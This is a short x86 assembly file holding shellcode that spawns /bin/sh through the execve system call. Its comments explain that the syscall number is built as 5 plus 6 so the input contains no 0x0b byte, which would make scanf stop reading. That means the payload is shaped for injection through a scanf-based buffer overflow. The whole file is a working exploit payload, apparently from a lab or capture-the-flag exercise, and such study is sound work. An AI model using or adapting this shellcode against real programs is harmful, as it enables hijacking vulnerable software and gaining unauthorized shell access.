; execve("/bin/sh",0,0)

bits 32
	xor ecx, ecx
	mul ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	; original version:
	; mov al, 0xb

	; modified because scanf terminates when
	; sees the byte 0xb
	mov al, 0x5
	add al, 0x6
	int 0x80
